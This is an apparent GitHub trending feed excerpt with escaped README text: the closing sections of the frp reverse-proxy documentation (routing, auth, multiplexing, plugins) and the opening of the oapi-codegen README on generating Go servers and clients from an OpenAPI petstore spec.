&#xA;&lt;p&gt;Note that parameter(s) prefixed with &lt;code&gt;header_&lt;/code&gt; will be added to HTTP request headers.&lt;/p&gt; &#xA;&lt;p&gt;In this example, it will set header &lt;code&gt;X-From-Where: frp&lt;/code&gt; in the HTTP request.&lt;/p&gt; &#xA;&lt;h3&gt;Get Real IP&lt;/h3&gt; &#xA;&lt;h4&gt;HTTP X-Forwarded-For&lt;/h4&gt; &#xA;&lt;p&gt;This feature is for http proxy only.&lt;/p&gt; &#xA;&lt;p&gt;You can get user&#39;s real IP from HTTP request headers &lt;code&gt;X-Forwarded-For&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h4&gt;Proxy Protocol&lt;/h4&gt; &#xA;&lt;p&gt;frp supports Proxy Protocol to send user&#39;s real IP to local services. It support all types except UDP.&lt;/p&gt; &#xA;&lt;p&gt;Here is an example for https service:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[web]&#xA;type = https&#xA;local_port = 443&#xA;custom_domains = test.example.com&#xA;&#xA;# now v1 and v2 are supported&#xA;proxy_protocol_version = v2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can enable Proxy Protocol support in nginx to expose user&#39;s real IP in HTTP header &lt;code&gt;X-Real-IP&lt;/code&gt;, and then read &lt;code&gt;X-Real-IP&lt;/code&gt; header in your web service for the real IP.&lt;/p&gt; &#xA;&lt;h3&gt;Require HTTP Basic Auth (Password) for Web Services&lt;/h3&gt; &#xA;&lt;p&gt;Anyone who can guess your tunnel URL can access your local web server unless you protect it with a password.&lt;/p&gt; &#xA;&lt;p&gt;This enforces HTTP Basic Auth on all requests with the username and password specified in frpc&#39;s configure file.&lt;/p&gt; &#xA;&lt;p&gt;It can only be enabled when proxy type is http.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[web]&#xA;type = http&#xA;local_port = 80&#xA;custom_domains = test.example.com&#xA;http_user = abc&#xA;http_pwd = abc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Visit &lt;code&gt;http://test.example.com&lt;/code&gt; in the browser and now you are prompted to enter the username and password.&lt;/p&gt; &#xA;&lt;h3&gt;Custom Subdomain Names&lt;/h3&gt; &#xA;&lt;p&gt;It is convenient to use &lt;code&gt;subdomain&lt;/code&gt; configure for http and https types when many people share one frps server.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;subdomain_host = frps.com&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Resolve &lt;code&gt;*.frps.com&lt;/code&gt; to the frps server&#39;s IP. This is usually called a Wildcard DNS record.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[web]&#xA;type = http&#xA;local_port = 80&#xA;subdomain = test&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now you can visit your web service on &lt;code&gt;test.frps.com&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Note that if &lt;code&gt;subdomain_host&lt;/code&gt; is not empty, &lt;code&gt;custom_domains&lt;/code&gt; should not be the subdomain of &lt;code&gt;subdomain_host&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;URL Routing&lt;/h3&gt; &#xA;&lt;p&gt;frp supports forwarding HTTP requests to different backend web services by url routing.&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;locations&lt;/code&gt; specifies the prefix of URL used for routing. frps first searches for the most specific prefix location given by literal strings regardless of the listed order.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[web01]&#xA;type = http&#xA;local_port = 80&#xA;custom_domains = web.example.com&#xA;locations = /&#xA;&#xA;[web02]&#xA;type = http&#xA;local_port = 81&#xA;custom_domains = web.example.com&#xA;locations = /news,/about&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;HTTP requests with URL prefix &lt;code&gt;/news&lt;/code&gt; or &lt;code&gt;/about&lt;/code&gt; will be forwarded to &lt;strong&gt;web02&lt;/strong&gt; and other requests to &lt;strong&gt;web01&lt;/strong&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;TCP Port Multiplexing&lt;/h3&gt; &#xA;&lt;p&gt;frp supports receiving TCP sockets directed to different proxies on a single port on frps, similar to &lt;code&gt;vhost_http_port&lt;/code&gt; and &lt;code&gt;vhost_https_port&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The only supported TCP port multiplexing method available at the moment is &lt;code&gt;httpconnect&lt;/code&gt; - HTTP CONNECT tunnel.&lt;/p&gt; &#xA;&lt;p&gt;When setting &lt;code&gt;tcpmux_httpconnect_port&lt;/code&gt; to anything other than 0 in frps under &lt;code&gt;[common]&lt;/code&gt;, frps will listen on this port for HTTP CONNECT requests.&lt;/p&gt; &#xA;&lt;p&gt;The host of the HTTP CONNECT request will be used to match the proxy in frps. Proxy hosts can be configured in frpc by configuring &lt;code&gt;custom_domain&lt;/code&gt; and / or &lt;code&gt;subdomain&lt;/code&gt; under &lt;code&gt;type = tcpmux&lt;/code&gt; proxies, when &lt;code&gt;multiplexer = httpconnect&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frps.ini&#xA;[common]&#xA;bind_port = 7000&#xA;tcpmux_httpconnect_port = 1337&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;&#xA;[proxy1]&#xA;type = tcpmux&#xA;multiplexer = httpconnect&#xA;custom_domains = test1&#xA;local_port = 80&#xA;&#xA;[proxy2]&#xA;type = tcpmux&#xA;multiplexer = httpconnect&#xA;custom_domains = test2&#xA;local_port = 8080&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In the above configuration - frps can be contacted on port 1337 with a HTTP CONNECT header such as:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;CONNECT test1 HTTP/1.1\r\n\r\n&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;and the connection will be routed to &lt;code&gt;proxy1&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Connecting to frps via HTTP PROXY&lt;/h3&gt; &#xA;&lt;p&gt;frpc can connect to frps using HTTP proxy if you set OS environment variable &lt;code&gt;HTTP_PROXY&lt;/code&gt;, or if &lt;code&gt;http_proxy&lt;/code&gt; is set in frpc.ini file.&lt;/p&gt; &#xA;&lt;p&gt;It only works when protocol is tcp.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[common]&#xA;server_addr = x.x.x.x&#xA;server_port = 7000&#xA;http_proxy = http://user:pwd@192.168.1.128:8080&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Range ports mapping&lt;/h3&gt; &#xA;&lt;p&gt;Proxy with names that start with &lt;code&gt;range:&lt;/code&gt; will support mapping range ports.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[range:test_tcp]&#xA;type = tcp&#xA;local_ip = 127.0.0.1&#xA;local_port = 6000-6006,6007&#xA;remote_port = 6000-6006,6007&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;frpc will generate 8 proxies like &lt;code&gt;test_tcp_0&lt;/code&gt;, &lt;code&gt;test_tcp_1&lt;/code&gt;, ..., &lt;code&gt;test_tcp_7&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Client Plugins&lt;/h3&gt; &#xA;&lt;p&gt;frpc only forwards requests to local TCP or UDP ports by default.&lt;/p&gt; &#xA;&lt;p&gt;Plugins are used for providing rich features. There are built-in plugins such as &lt;code&gt;unix_domain_socket&lt;/code&gt;, &lt;code&gt;http_proxy&lt;/code&gt;, &lt;code&gt;socks5&lt;/code&gt;, &lt;code&gt;static_file&lt;/code&gt;, &lt;code&gt;http2https&lt;/code&gt;, &lt;code&gt;https2http&lt;/code&gt;, &lt;code&gt;https2https&lt;/code&gt; and you can see &lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/#example-usage&#34;&gt;example usage&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Specify which plugin to use with the &lt;code&gt;plugin&lt;/code&gt; parameter. Configuration parameters of plugin should be started with &lt;code&gt;plugin_&lt;/code&gt;. &lt;code&gt;local_ip&lt;/code&gt; and &lt;code&gt;local_port&lt;/code&gt; are not used for plugin.&lt;/p&gt; &#xA;&lt;p&gt;Using plugin &lt;strong&gt;http_proxy&lt;/strong&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-ini&#34;&gt;# frpc.ini&#xA;[http_proxy]&#xA;type = tcp&#xA;remote_port = 6000&#xA;plugin = http_proxy&#xA;plugin_http_user = abc&#xA;plugin_http_passwd = abc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;plugin_http_user&lt;/code&gt; and &lt;code&gt;plugin_http_passwd&lt;/code&gt; are configuration parameters used in &lt;code&gt;http_proxy&lt;/code&gt; plugin.&lt;/p&gt; &#xA;&lt;h3&gt;Server Manage Plugins&lt;/h3&gt; &#xA;&lt;p&gt;Read the &lt;a href=&#34;https://raw.githubusercontent.com/fatedier/frp/dev/doc/server_plugin.md&#34;&gt;document&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Find more plugins in &lt;a href=&#34;https://github.com/gofrp/plugin&#34;&gt;gofrp/plugin&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Development Plan&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Log HTTP request information in frps.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;Interested in getting involved? We would like to help you!&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Take a look at our &lt;a href=&#34;https://github.com/fatedier/frp/issues&#34;&gt;issues list&lt;/a&gt; and consider sending a Pull Request to &lt;strong&gt;dev branch&lt;/strong&gt;.&lt;/li&gt; &#xA; &lt;li&gt;If you want to add a new feature, please create an issue first to describe the new feature, as well as the implementation approach. Once a proposal is accepted, create an implementation of the new features and submit it as a pull request.&lt;/li&gt; &#xA; &lt;li&gt;Sorry for my poor English. Improvements for this document are welcome, even some typo fixes.&lt;/li&gt; &#xA; &lt;li&gt;If you have great ideas, send an email to &lt;a href=&#34;mailto:fatedier@gmail.com&#34;&gt;fatedier@gmail.com&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;strong&gt;Note: We prefer you to give your advise in &lt;a href=&#34;https://github.com/fatedier/frp/issues&#34;&gt;issues&lt;/a&gt;, so others with a same question can search it quickly and we don&#39;t need to answer them repeatedly.&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Donation&lt;/h2&gt; &#xA;&lt;p&gt;If frp helps you a lot, you can support us by:&lt;/p&gt; &#xA;&lt;h3&gt;GitHub Sponsors&lt;/h3&gt; &#xA;&lt;p&gt;Support us by &lt;a href=&#34;https://github.com/sponsors/fatedier&#34;&gt;Github Sponsors&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You can have your company&#39;s logo placed on README file of this project.&lt;/p&gt; &#xA;&lt;h3&gt;PayPal&lt;/h3&gt; &#xA;&lt;p&gt;Donate money by &lt;a href=&#34;https://www.paypal.me/fatedier&#34;&gt;PayPal&lt;/a&gt; to my account &lt;strong&gt;&lt;a href=&#34;mailto:fatedier@gmail.com&#34;&gt;fatedier@gmail.com&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>deepmap/oapi-codegen</title>
    <updated>2022-05-29T01:42:16Z</updated>
    <id>tag:github.com,2022-05-29:/deepmap/oapi-codegen</id>
    <link href="https://github.com/deepmap/oapi-codegen" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Generate Go client and server boilerplate from OpenAPI 3 specifications&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;OpenAPI Client and Server Code Generator&lt;/h2&gt; &#xA;&lt;p&gt;This package contains a set of utilities for generating Go boilerplate code for services based on &lt;a href=&#34;https://github.com/OAI/OpenAPI-Specification/raw/master/versions/3.0.0.md&#34;&gt;OpenAPI 3.0&lt;/a&gt; API definitions. When working with services, it&#39;s important to have an API contract which servers and clients both implement to minimize the chances of incompatibilities. It&#39;s tedious to generate Go models which precisely correspond to OpenAPI specifications, so let our code generator do that work for you, so that you can focus on implementing the business logic for your service.&lt;/p&gt; &#xA;&lt;p&gt;We have chosen to focus on &lt;a href=&#34;https://github.com/labstack/echo&#34;&gt;Echo&lt;/a&gt; as our default HTTP routing engine, due to its speed and simplicity for the generated stubs, and &lt;a href=&#34;https://github.com/go-chi/chi&#34;&gt;Chi&lt;/a&gt;, and &lt;a href=&#34;https://github.com/gin-gonic/gin&#34;&gt;Gin&lt;/a&gt; have also been added by contributors as additional routers. We chose Echo because the &lt;code&gt;Context&lt;/code&gt; object is a mockable interface, and it allows for some advanced testing.&lt;/p&gt; &#xA;&lt;p&gt;This package tries to be too simple rather than too generic, so we&#39;ve made some design decisions in favor of simplicity, knowing that we can&#39;t generate strongly typed Go code for all possible OpenAPI Schemas. If there is a way to accomplish something via utility code or reflection, it&#39;s probably a better approach than code generation, which is fragile due to the very dynamic nature of OpenAPI and the very static nature of Go.&lt;/p&gt; &#xA;&lt;h2&gt;Overview&lt;/h2&gt; &#xA;&lt;p&gt;We&#39;re going to use the OpenAPI example of the &lt;a href=&#34;https://github.com/OAI/OpenAPI-Specification/raw/master/examples/v3.0/petstore-expanded.yaml&#34;&gt;Expanded Petstore&lt;/a&gt; in the descriptions below, please have a look at it.&lt;/p&gt; &#xA;&lt;p&gt;In order to create a Go server to serve this exact schema, you would have to write a lot of boilerplate code to perform all the marshalling and unmarshalling into objects which match the OpenAPI 3.0 definition. The code generator in this directory does a lot of that for you. You would run it like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;go install github.com/deepmap/oapi-codegen/cmd/oapi-codegen@latest&#xA;oapi-codegen petstore-expanded.yaml &amp;gt; petstore.gen.go&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Let&#39;s go through that &lt;code&gt;petstore.gen.go&lt;/code&gt; file to show you everything which was generated.&lt;/p&gt; &#xA;&lt;h2&gt;Generated Server Boilerplate&lt;/h2&gt; &#xA;&lt;p&gt;The &lt;code&gt;/components/schemas&lt;/code&gt; section in OpenAPI defines reusable objects, so Go types are generated for these. The Pet Store example defines &lt;code&gt;Error&lt;/code&gt;, &lt;code&gt;Pet&lt;/code&gt;, &lt;code&gt;Pets&lt;/code&gt; and &lt;code&gt;NewPet&lt;/code&gt;, so we do the same in Go:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Error defines model for Error.&#xA;type Error struct {&#xA;    // Error code&#xA;    Code int32 `json:&#34;code&#34;`&#xA;&#xA;    // Error message&#xA;    Message string `json:&#34;message&#34;`&#xA;}&#xA;&#xA;// NewPet defines model for NewPet.&#xA;type NewPet struct {&#xA;    // Name of the pet&#xA;    Name string `json:&#34;name&#34;`&#xA;&#xA;    // Type of the pet&#xA;    Tag *string `json:&#34;tag,omitempty&#34;`&#xA;}&#xA;&#xA;// Pet defines model for Pet.&#xA;type Pet struct {&#xA;    // Unique id of the pet&#xA;    Id int64 `json:&#34;id&#34;`&#xA;&#xA;    // Name of the pet&#xA;    Name string `json:&#34;name&#34;`&#xA;&#xA;    // Type of the pet&#xA;    Tag *string `json:&#34;tag,omitempty&#34;`&#xA;}&#xA;&#xA;// Type definition for component schema &#34;Pets&#34;&#xA;type Pets []Pet&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It&#39;s best to define objects under &lt;code&gt;/components&lt;/code&gt; field in the schema, since those will be turned into named Go types. If you use inline types in your handler definitions, we will generate inline, anonymous Go types, but those are more tedious to deal with since you will have to redeclare them at every point of use.&lt;/p&gt; &#xA;&lt;p&gt;For each element in the &lt;code&gt;paths&lt;/code&gt; map in OpenAPI, we will generate a Go handler function in an interface object. Here is the generated Go interface for our Echo server.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type ServerInterface interface {&#xA;    //  (GET /pets)&#xA;    FindPets(ctx echo.Context, params FindPetsParams) error&#xA;    //  (POST /pets)&#xA;    AddPet(ctx echo.Context) error&#xA;    //  (DELETE /pets/{id})&#xA;    DeletePet(ctx echo.Context, id int64) error&#xA;    //  (GET /pets/{id})&#xA;    FindPetById(ctx echo.Context, id int64) error&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;These are the functions which you will implement yourself in order to create a server conforming to the API specification. Normally, all the arguments and parameters are stored on the &lt;code&gt;echo.Context&lt;/code&gt; in handlers, so we do the tedious work of of unmarshaling the JSON automatically, simply passing values into your handlers.&lt;/p&gt; &#xA;&lt;p&gt;Notice that &lt;code&gt;FindPetById&lt;/code&gt; takes a parameter &lt;code&gt;id int64&lt;/code&gt;. All path arguments will be passed as arguments to your function, since they are mandatory.&lt;/p&gt; &#xA;&lt;p&gt;Remaining arguments can be passed in headers, query arguments or cookies. Those will be written to a &lt;code&gt;params&lt;/code&gt; object. Look at the &lt;code&gt;FindPets&lt;/code&gt; function above, it takes as input &lt;code&gt;FindPetsParams&lt;/code&gt;, which is defined as follows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Parameters object for FindPets&#xA;type FindPetsParams struct {&#xA;   Tags  *[]string `json:&#34;tags,omitempty&#34;`&#xA;   Limit *int32   `json:&#34;limit,omitempty&#34;`&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The HTTP query parameter &lt;code&gt;limit&lt;/code&gt; turns into a Go field named &lt;code&gt;Limit&lt;/code&gt;. It is passed by pointer, since it is an optional parameter. If the parameter is specified, the pointer will be non-&lt;code&gt;nil&lt;/code&gt;, and you can read its value.&lt;/p&gt; &#xA;&lt;p&gt;If you changed the OpenAPI specification to make the parameter required, the &lt;code&gt;FindPetsParams&lt;/code&gt; structure will contain the type by value:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type FindPetsParams struct {&#xA;    Tags  *[]string `json:&#34;tags,omitempty&#34;`&#xA;    Limit int32     `json:&#34;limit&#34;`&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Registering handlers&lt;/h3&gt; &#xA;&lt;p&gt;There are a few ways of registering your http handler based on the type of server generated i.e. &lt;code&gt;-generate server&lt;/code&gt; or &lt;code&gt;-generate chi-server&lt;/code&gt;&lt;/p&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;code&gt;Echo&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;p&gt;Code generated using &lt;code&gt;-generate server&lt;/code&gt;.&lt;/p&gt; &#xA; &lt;p&gt;The usage of &lt;code&gt;Echo&lt;/code&gt; is out of scope of this doc, but once you have an echo instance, we generate a utility function to help you associate your handlers with this autogenerated code. For the pet store, it looks like this:&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func RegisterHandlers(router codegen.EchoRouter, si ServerInterface) {&#xA;    wrapper := ServerInterfaceWrapper{&#xA;        Handler: si,&#xA;    }&#xA;    router.GET(&#34;/pets&#34;, wrapper.FindPets)&#xA;    router.POST(&#34;/pets&#34;, wrapper.AddPet)&#xA;    router.DELETE(&#34;/pets/:id&#34;, wrapper.DeletePet)&#xA;    router.GET(&#34;/pets/:id&#34;, wrapper.FindPetById)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;The wrapper functions referenced above contain generated code which pulls parameters off the &lt;code&gt;Echo&lt;/code&gt; request context, and unmarshals them into Go objects.&lt;/p&gt; &#xA; &lt;p&gt;You would register the generated handlers as follows:&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;func SetupHandler() {&#xA;    var myApi PetStoreImpl  // This implements the pet store interface&#xA;    e := echo.New()&#xA;    petstore.RegisterHandlers(e, &amp;amp;myApi)&#xA;    ...&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;code&gt;Chi&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;p&gt;Code generated using &lt;code&gt;-generate chi-server&lt;/code&gt;.&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type PetStoreImpl struct {}&#xA;func (*PetStoreImpl) GetPets(w http.ResponseWriter, r *http.Request) {&#xA;    // Implement me&#xA;}&#xA;&#xA;func SetupHandler() {&#xA;    var myApi PetStoreImpl&#xA;&#xA;    r := chi.NewRouter()&#xA;    r.Mount(&#34;/&#34;, Handler(&amp;amp;myApi))&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;code&gt;Gin&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;p&gt;Code generated using &lt;code&gt;-generate gin&lt;/code&gt;.&lt;/p&gt; &#xA; &lt;p&gt;The usage of &lt;code&gt;gin&lt;/code&gt; is out of scope of this doc, but once you have an gin instance, we generate a utility function to help you associate your handlers with this autogenerated code. For the pet store, it looks like this:&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// RegisterHandlersWithOptions creates http.Handler with additional options&#xA;func RegisterHandlersWithOptions(router *gin.Engine, si ServerInterface, options GinServerOptions) *gin.Engine {&#xA;&#x9;wrapper := ServerInterfaceWrapper{&#xA;&#x9;&#x9;Handler:            si,&#xA;&#x9;&#x9;HandlerMiddlewares: options.Middlewares,&#xA;&#x9;}&#xA;&#xA;&#x9;router.GET(options.BaseURL+&#34;/pets&#34;, wrapper.FindPets)&#xA;&#x9;router.POST(options.BaseURL+&#34;/pets&#34;, wrapper.AddPet)&#xA;&#x9;router.DELETE(options.BaseURL+&#34;/pets/:id&#34;, wrapper.DeletePet)&#xA;&#x9;router.GET(options.BaseURL+&#34;/pets/:id&#34;, wrapper.FindPetByID)&#xA;&#x9;return router&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;import (&#xA;&#x9;&#34;github.com/gin-gonic/gin&#34;&#xA;&#x9;&#34;github.com/deepmap/oapi-codegen/examples/petstore-expanded/gin/api&#34;&#xA;&#x9;middleware &#34;github.com/deepmap/oapi-codegen/pkg/gin-middleware&#34;&#xA;)&#xA;&#xA;type PetStoreImpl struct {}&#xA;func (*PetStoreImpl) GetPets(w http.ResponseWriter, r *http.Request) {&#xA;    // Implement me&#xA;}&#xA;&#xA;func SetupHandler() {&#xA;    var myApi PetStoreImpl&#xA;&#xA;    r := gin.Default()&#xA;&#x9;  r.Use(middleware.OapiRequestValidator(swagger))&#xA;    r = api.RegisterHandlers(r, petStore)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;code&gt;net/http&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;p&gt;&lt;a href=&#34;https://github.com/go-chi/chi&#34;&gt;Chi&lt;/a&gt; is 100% compatible with &lt;code&gt;net/http&lt;/code&gt; allowing the following with code generated using &lt;code&gt;-generate chi-server&lt;/code&gt;.&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;type PetStoreImpl struct {}&#xA;func (*PetStoreImpl) GetPets(w http.ResponseWriter, r *http.Request) {&#xA;    // Implement me&#xA;}&#xA;&#xA;func SetupHandler() {&#xA;    var myApi PetStoreImpl&#xA;&#xA;    http.Handle(&#34;/&#34;, Handler(&amp;amp;myApi))&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;Alternatively, &lt;a href=&#34;https://github.com/gorilla/mux&#34;&gt;Gorilla&lt;/a&gt; is also 100% compatible with &lt;code&gt;net/http&lt;/code&gt; and can be generated with &lt;code&gt;-generate gorilla&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;h4&gt;Additional Properties in type definitions&lt;/h4&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://swagger.io/specification/#schemaObject&#34;&gt;OpenAPI Schemas&lt;/a&gt; implicitly accept &lt;code&gt;additionalProperties&lt;/code&gt;, meaning that any fields provided, but not explicitly defined via properties on the schema are accepted as input, and propagated. When unspecified, the &lt;code&gt;additionalProperties&lt;/code&gt; field is assumed to be &lt;code&gt;true&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Additional properties are tricky to support in Go with typing, and require lots of boilerplate code, so in this library, we assume that &lt;code&gt;additionalProperties&lt;/code&gt; defaults to &lt;code&gt;false&lt;/code&gt; and we don&#39;t generate this boilerplate. If you would like an object to accept &lt;code&gt;additionalProperties&lt;/code&gt;, specify a schema for &lt;code&gt;additionalProperties&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Say we declared &lt;code&gt;NewPet&lt;/code&gt; above like so:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-yaml&#34;&gt;    NewPet:&#xA;      required:&#xA;        - name&#xA;      properties:&#xA;        name:&#xA;          type: string&#xA;        tag:&#xA;          type: string&#xA;      additionalProperties:&#xA;        type: string&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The Go code for &lt;code&gt;NewPet&lt;/code&gt; would now look like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// NewPet defines model for NewPet.&#xA;type NewPet struct {&#xA;&#x9;Name                 string            `json:&#34;name&#34;`&#xA;&#x9;Tag                  *string           `json:&#34;tag,omitempty&#34;`&#xA;&#x9;AdditionalProperties map[string]string `json:&#34;-&#34;`&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The additionalProperties, of type &lt;code&gt;string&lt;/code&gt; become &lt;code&gt;map[string]string&lt;/code&gt;, which maps field names to instances of the &lt;code&gt;additionalProperties&lt;/code&gt; schema.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Getter for additional properties for NewPet. Returns the specified&#xA;// element and whether it was found&#xA;func (a NewPet) Get(fieldName string) (value string, found bool) {...}&#xA;&#xA;// Setter for additional properties for NewPet&#xA;func (a *NewPet) Set(fieldName string, value string) {...}&#xA;&#xA;// Override default JSON handling for NewPet to handle additionalProperties&#xA;func (a *NewPet) UnmarshalJSON(b []byte) error {...}&#xA;&#xA;// Override default JSON handling for NewPet to handle additionalProperties&#xA;func (a NewPet) MarshalJSON() ([]byte, error) {...}w&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;There are many special cases for &lt;code&gt;additionalProperties&lt;/code&gt;, such as having to define types for inner fields which themselves support additionalProperties, and all of them are tested via the &lt;code&gt;internal/test/components&lt;/code&gt; schemas and tests. Please look through those tests for more usage examples.&lt;/p&gt; &#xA;&lt;h2&gt;Generated Client Boilerplate&lt;/h2&gt; &#xA;&lt;p&gt;Once your server is up and running, you probably want to make requests to it. If you&#39;re going to do those requests from your Go code, we also generate a client which is conformant with your schema to help in marshaling objects to JSON. It uses the same types and similar function signatures to your request handlers.&lt;/p&gt; &#xA;&lt;p&gt;The interface for the pet store looks like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// The interface specification for the client above.&#xA;type ClientInterface interface {&#xA;&#xA;&#x9;// FindPets request&#xA;&#x9;FindPets(ctx context.Context, params *FindPetsParams, reqEditors ...RequestEditorFn) (*http.Response, error)&#xA;&#xA;&#x9;// AddPet request with JSON body&#xA;&#x9;AddPet(ctx context.Context, body NewPet, reqEditors ...RequestEditorFn) (*http.Response, error)&#xA;&#xA;&#x9;// DeletePet request&#xA;&#x9;DeletePet(ctx context.Context, id int64, reqEditors ...RequestEditorFn) (*http.Response, error)&#xA;&#xA;&#x9;// FindPetById request&#xA;&#x9;FindPetById(ctx context.Context, id int64, reqEditors ...RequestEditorFn) (*http.Response, error)&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;A Client object which implements the above interface is also generated:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-go&#34;&gt;// Client which conforms to the OpenAPI3 specification for this service.&#xA;type Client struct {&#xA;    // The endpoint of the server conforming to this interface, with scheme,&#xA;    // https://api.deepmap.com for example.&#xA;    Server string&#xA;&#xA;    // HTTP client with any customized settings, such as certificate chains.&#xA;    Client http.Client&#xA;&#xA;    // A callback for modifying requests which are generated before sending over&#xA;    // the network.&#xA;    RequestEditors []func(ctx context.Context, req *http.Request) error&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Each operation in your 